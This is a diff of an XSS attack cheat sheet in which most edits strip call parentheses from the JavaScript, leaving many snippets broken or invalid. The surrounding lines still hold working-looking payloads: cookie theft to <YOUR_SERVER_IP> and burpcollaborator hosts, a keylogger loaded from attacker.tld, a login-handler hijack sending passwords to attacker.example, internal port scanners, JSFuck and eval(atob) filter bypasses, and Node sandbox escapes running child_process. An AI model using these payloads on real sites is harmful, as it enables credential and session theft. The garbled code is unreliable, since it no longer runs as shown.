@@ -81,18 +81,18 @@ console.log(toCharCodes('https://attacker.tld/keylogger.js'))
 A resulting attribute looked like:
 
 ```html
-onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
+onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function{}"
 ```
 
 **Why this steals credentials**
 
-The external script (loaded from an attacker-controlled host or Burp Collaborator) hooked `document.onkeypress`, buffered keystrokes, and every second issued `new Image().src = collaborator_url + keys`. Because the XSS only fires for unauthenticated users, the sensitive action is the login form itself—the attacker keylogs usernames and passwords even if the victim never presses "Login".
+The external script (loaded from an attacker-controlled host or Burp Collaborator) hooked `document.onkeypress`, buffered keystrokes, and every second issued `new Image.src = collaborator_url + keys`. Because the XSS only fires for unauthenticated users, the sensitive action is the login form itself—the attacker keylogs usernames and passwords even if the victim never presses "Login".
 
 Weird example of Angular executing XSS if you controls a class name:
 
 ```html
 <div ng-app>
-  <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
+  <strong class="ng-init:constructor.constructor('alert(1)')">aaa</strong>
 </div>
 ```
 
@@ -298,8 +298,8 @@ If you **cannot escape from the tag**, you could create new attributes inside th
 **Style events**
 
 ```python
-<p style="animation: x;" onanimationstart="alert()">XSS</p>
-<p style="animation: x;" onanimationend="alert()">XSS</p>
+<p style="animation: x;" onanimationstart="alert">XSS</p>
+<p style="animation: x;" onanimationend="alert">XSS</p>
 
 #ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
 <div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
@@ -529,7 +529,7 @@ and
 
 Now you can modify our link and bring it to the form
 
-> \<a href="" id=someid class=test onclick=alert() a="">
+> \<a href="" id=someid class=test onclick=alert a="">
 
 This trick was taken from [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)<sup>[[8]](#references)</sup>
 
@@ -589,7 +589,7 @@ This can be **abused** using:
 
 ```javascript
 // This is valid JS code, because each time the function returns itself it's recalled with ``
-function loop() {
+function loop {
   return loop
 }
 loop``
@@ -604,7 +604,7 @@ loop``
 <iframe srcdoc="<SCRIPT>alert(1)</iframe>">
 ```
 
-#### Deliverable payloads with eval(atob()) and scope nuances
+#### Deliverable payloads with eval(atob) and scope nuances
 
 To keep URLs shorter and bypass naive keyword filters, you can base64-encode your real logic and evaluate it with `eval(atob('...'))`. If simple keyword filtering blocks identifiers like `alert`, `eval`, or `atob`, use Unicode-escaped identifiers which compile identically in the browser but evade string-matching filters:<sup>[[4]](#references)</sup>
 
@@ -613,11 +613,11 @@ To keep URLs shorter and bypass naive keyword filters, you can base64-encode you
 \u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
 ```
 
-Important scoping nuance: `const`/`let` declared inside `eval()` are block-scoped and do NOT create globals; they won’t be accessible to later scripts. Use a dynamically injected `<script>` element to define global, non-rebindable hooks when needed (e.g., to hijack a form handler):
+Important scoping nuance: `const`/`let` declared inside `eval` are block-scoped and do NOT create globals; they won’t be accessible to later scripts. Use a dynamically injected `<script>` element to define global, non-rebindable hooks when needed (e.g., to hijack a form handler):
 
 ```javascript
 var s = document.createElement('script');
-s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
+s.textContent = "const DoLogin =  => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
 document.head.appendChild(s);
 ```
 
@@ -703,10 +703,10 @@ alert("//\u2029alert(1)") //0xe2 0x80 0xa9
 
 ```javascript
 log=[];
-function funct(){}
+function funct{}
   for(let i=0;i<=0x10ffff;i++){
       try{
-        eval(`funct${String.fromCodePoint(i)}()`);
+        eval(`funct${String.fromCodePoint(i)}`);
         log.push(i);
       }
       catch(e){}
@@ -748,7 +748,7 @@ eval.apply`${[`alert\x281\x29`]}`
 [].map.call`${eval}\\u{61}lert\x281337\x29`
 
   // To pass several arguments you can use
-function btt(){
+function btt{
     console.log(arguments);
 }
 btt`${'arg1'}${'arg2'}${'arg3'}`
@@ -775,7 +775,7 @@ Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It re
 
 // valueOf, toString
   // These operations are called when the object is used as a primitive
-  // The object is passed as "this"; alert() needs "window", so use window methods
+  // The object is passed as "this"; alert needs "window", so use window methods
 valueOf=alert;window+''
 toString=alert;window+''
 
@@ -817,7 +817,7 @@ setTimeout('ale'+'rt(2)');
 setInterval('ale'+'rt(10)');
 Function('ale'+'rt(10)')``;
 [].constructor.constructor("alert(document.domain)")``
-[]["constructor"]["constructor"]`$${alert()}```
+[]["constructor"]["constructor"]`$${alert}```
 import('data:text/javascript,alert(1)')
 
 //General function executions
@@ -844,9 +844,9 @@ content'alert'
 [12].forEach(alert);
 top/al/.source+/ert/.source
 top8680439..toString(30)
-Function("ale"+"rt(1)")();
+Function("ale"+"rt(1)");
 new Function`al\ert\`6\``;
-Set.constructor('ale'+'rt(13)')();
+Set.constructor('ale'+'rt(13)');
 Set.constructor`al\x65rt\x2814\x29```;
 $='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
 x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
@@ -854,7 +854,7 @@ this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
 globalThis[`al`+/ert/.source]`1`
 this[`al`+/ert/.source]`1`
 [alert][0].call(this,1)
-window['a'+'l'+'e'+'r'+'t']()
+window['a'+'l'+'e'+'r'+'t']
 window['a'+'l'+'e'+'r'+'t'].call(this,1)
 top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
 (1,2,3,4,5,6,7,8,alert)(1)
@@ -867,7 +867,7 @@ al\u0065rt`1`
 top'al\145rt'
 top'al\x65rt'
 top8680439..toString(30)
-<svg><animate onbegin=alert() attributeName=x></svg>
+<svg><animate onbegin=alert attributeName=x></svg>
 ```
 
 ## **DOM vulnerabilities**
@@ -964,7 +964,7 @@ Then, the onfocus attribute will be inserted and XSS occurs.
 <img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
 <svg><x><script>alert('1'&#41</x>
 <iframe src=""/srcdoc='<svg onload=alert(1)>'>
-<svg><animate onbegin=alert() attributeName=x></svg>
+<svg><animate onbegin=alert attributeName=x></svg>
 <img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
 <img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
 (function(x){thisx+`ert`})`al`
@@ -1119,12 +1119,12 @@ If you are only have a limited set of chars to use, check these other valid solu
 
 ```javascript
 // eval + unescape + regex
-eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
-eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))
+eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))
+eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart%22)%2f/))
 
 // use of with
 with(console)log(123)
-with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
+with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)
   // Just replace console.log(1) to the real code, the code we want to run is:
   //return String(process.mainModule.require('fs').readFileSync('flag.txt'))
 
@@ -1142,7 +1142,7 @@ with(
   /)
 with(this)
   with(constructor)
-    constructor(source)()
+    constructor(source)
 
 // For more uses of with go to challenge misc/CaaSio PSE in
 // https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
@@ -1150,7 +1150,7 @@ with(this)
 
 If **everything is undefined** before executing untrusted code (like in [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) it's possible to generate useful objects "out of nothing" to abuse the execution of arbitrary untrusted code:<sup>[[15]](#references)</sup>
 
-- Using import()
+- Using import
 
 ```javascript
 // although import "fs" doesn’t work, import('fs') does.
@@ -1170,26 +1170,26 @@ import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
 Therefore, if from that module we can **call another function**, it's possible to use `arguments.callee.caller.arguments[1]` from that function to access **`require`**:
 
 ```javascript
-;(function () {
+;(function  {
   return arguments.callee.caller.arguments1.readFileSync(
     "/flag.txt",
     "utf8"
   )
-})()
+})
 ```
 
 In a similar way to the previous example, it's possible to **use error handlers** to access the **wrapper** of the module and get the **`require`** function:
 
 ```javascript
 try {
-  null.f()
+  null.f
 } catch (e) {
   TypeError = e.constructor
 }
 Object = {}.constructor
 String = "".constructor
 Error = TypeError.prototype.__proto__.constructor
-function CustomError() {
+function CustomError {
   const oldStackTrace = Error.prepareStackTrace
   try {
     Error.prepareStackTrace = (err, structuredStackTrace) =>
@@ -1200,22 +1200,22 @@ function CustomError() {
     Error.prepareStackTrace = oldStackTrace
   }
 }
-function trigger() {
-  const err = new CustomError()
+function trigger {
+  const err = new CustomError
   console.log(err.stack[0])
   for (const x of err.stack) {
-    // Use x.getFunction() to obtain Node.js's outer wrapper, then read its arguments
-    const fn = x.getFunction()
+    // Use x.getFunction to obtain Node.js's outer wrapper, then read its arguments
+    const fn = x.getFunction
     console.log(String(fn).slice(0, 200))
     console.log(fn?.arguments)
     console.log("=".repeat(40))
     if ((args = fn?.arguments)?.length > 0) {
       req = args[1]
-      console.log(req("child_process").execSync("id").toString())
+      console.log(req("child_process").execSync("id").toString)
     }
   }
 }
-trigger()
+trigger
 ```
 
 ### Obfuscation & Advanced Bypass
@@ -1234,19 +1234,19 @@ trigger()
 //Katana
 <script>
   ([,ウ,,,,ア]=[]+{}
-  ,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ]ツ')()
+  ,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ]ツ')
 </script>
 ```
 
 ```javascript
 //JJencode
-<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
+<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\""));</script>
 ```
 
 ```javascript
 //JSFuck
 <script>
-  (+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
+  (+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])
 </script>
 ```
 
@@ -1410,8 +1410,8 @@ Make the use navigate in the page without exiting an iframe and steal of his act
 ```javascript
 <img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
 <img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
-<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
-<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
+<script>new Image.src="http://<IP>/?c="+encodeURI(document.cookie);</script>
+<script>new Audio.src="http://<IP>/?c="+escape(document.cookie);</script>
 <script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
 <script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
 <script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
@@ -1420,10 +1420,10 @@ Make the use navigate in the page without exiting an iframe and steal of his act
 <script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
 <script>window['location']'assign'</script>
 <script>window['location']'href'</script>
-<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
-<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
+<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join</script>
+<script>var i=new Image;i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
 <script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
-<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
+<script>var xhttp=new XMLHttpRequest;xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send;</script>
 <script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
 <script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
 <script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
@@ -1437,8 +1437,8 @@ Make the use navigate in the page without exiting an iframe and steal of his act
 ```javascript
 var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
 var attacker = "http://10.10.14.8/exfil"
-var xhr = new XMLHttpRequest()
-xhr.onreadystatechange = function () {
+var xhr = new XMLHttpRequest
+xhr.onreadystatechange = function  {
   if (xhr.readyState == XMLHttpRequest.DONE) {
     fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
   }
@@ -1461,7 +1461,7 @@ xhr.send(null)
   for (i = 1; i <= 255; i++) {
     q.push(
       (function (url) {
-        return function () {
+        return function  {
           fetchUrl(url, wait)
         }
       })("http://192.168.0." + i + ":8080")
@@ -1470,16 +1470,16 @@ xhr.send(null)
 
   // Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
   for (i = 1; i <= n_threads; i++) {
-    if (q.length) q.shift()()
+    if (q.length) q.shift
   }
 
   function fetchUrl(url, wait) {
     console.log(url)
-    var controller = new AbortController(),
+    var controller = new AbortController,
       signal = controller.signal
     fetch(url, { signal })
       .then((r) =>
-        r.text().then((text) => {
+        r.text.then((text) => {
           location =
             collaboratorURL +
             "?ip=" +
@@ -1487,19 +1487,19 @@ xhr.send(null)
             "&code=" +
             encodeURIComponent(text) +
             "&" +
-            Date.now()
+            Date.now
         })
       )
       .catch((e) => {
         if (!String(e).includes("The user aborted a request") && q.length) {
-          q.shift()()
+          q.shift
         }
       })
 
     setTimeout((x) => {
-      controller.abort()
+      controller.abort
       if (q.length) {
-        q.shift()()
+        q.shift
       }
     }, wait)
   }
@@ -1509,7 +1509,7 @@ xhr.send(null)
 ### Port Scanner (fetch)
 
 ```javascript
-const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
+const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then( => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
 ```
 
 ### Port Scanner (websockets)
@@ -1518,13 +1518,13 @@ const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" 
 var ports = [80, 443, 445, 554, 3306, 3690, 1234];
 for(var i=0; i<ports.length; i++) {
     var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
-    s.start = performance.now();
+    s.start = performance.now;
     s.port = ports[i];
-    s.onerror = function() {
-        console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
+    s.onerror = function {
+        console.log("Port " + this.port + ": " + (performance.now -this.start) + " ms");
     };
-    s.onopen = function() {
-        console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
+    s.onopen = function {
+        console.log("Port " + this.port+ ": " + (performance.now -this.start) + " ms");
     };
 }
 ```
@@ -1556,10 +1556,10 @@ When any data is introduced in the password field, the username and password is 
 
 ### Hijack form handlers to exfiltrate credentials (const shadowing)
 
-If a critical handler (e.g., `function DoLogin(){...}`) is declared later in the page, and your payload runs earlier (e.g., via an inline JS-in-JS sink), define a `const` with the same name first to preempt and lock the handler. Later function declarations cannot rebind a `const` name, leaving your hook in control:<sup>[[4]](#references)</sup>
+If a critical handler (e.g., `function DoLogin{...}`) is declared later in the page, and your payload runs earlier (e.g., via an inline JS-in-JS sink), define a `const` with the same name first to preempt and lock the handler. Later function declarations cannot rebind a `const` name, leaving your hook in control:<sup>[[4]](#references)</sup>
 
 ```javascript
-const DoLogin = () => {
+const DoLogin =  => {
   const pwd  = Trim(FormInput.InputPassword.value);
   const user = Trim(FormInput.InputUtente.value);
   fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
@@ -1568,7 +1568,7 @@ const DoLogin = () => {
